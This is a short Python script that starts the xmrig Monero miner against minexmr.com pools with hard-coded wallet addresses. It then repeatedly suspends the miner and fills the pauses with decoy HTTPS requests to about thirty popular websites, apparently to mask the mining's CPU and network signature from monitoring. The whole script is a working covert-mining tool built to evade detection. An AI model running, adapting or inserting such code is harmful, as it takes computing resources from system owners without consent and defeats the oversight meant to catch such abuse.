#xmrig -o pool.minexmr.com:4444 -u 47wcnDjCDdjATivqH9GjC92jH9Vng7LCBMMxFmTV1Ybf5227MXhyD2gXynLUa9zrh5aPMAnu5npeQ2tLy8Z4pH7461vk6uo
import subprocess
import psutil
import time
import requests
list = [
'cmu.edu',
'ow.ly',
'answers.com',
'surveymonkey.com',
'hostgator.com',
'privacy.gov.au',
'theglobeandmail.com',
'pbs.org',
'yolasite.com',
'loc.gov',
'acquirethisname.com',
'illinois.edu',
'yahoo.co.jp',
'go.com',
'flickr.com',
'jalbum.net',
'linkedin.com',
'pen.io',
'randomlists.com',
'ucsd.edu',
'nbcnews.com',
'tmall.com',
'de.vu',
'un.org',
'blogs.com',
'huffingtonpost.com',
'wp.com',
'hud.gov',
'apache.org',
'live.com'
]
proc = subprocess.Popen(["./xmrig","-o","us-west.minexmr.com:443", "--cpu-no-yield", "--randomx-1gb-pages", "--threads=2", "-u", "49v6FWpHpV9h16cKTfeQDm1JekTdZvGTTF8aUT1nZvSkgV4Ka18261ATrfHmqJCi1MJUCFgWLCxZYeoZ8Yw8MzKtVfQRU4W", "-k", "--tls"])
proc = psutil.Process(pid=proc.pid)
while True:
    time.sleep(60)
    print('pausing')
    proc.suspend()
    last = time.time()
    while time.time() - last < 60:
        for x in list:
            try:
                r = requests.get('https://' + x)
#                val = 0
#                while val < 10000000:
#                    val += 1
                time.sleep(1)
            except:
                pass
    print('starting')
    proc.resume()

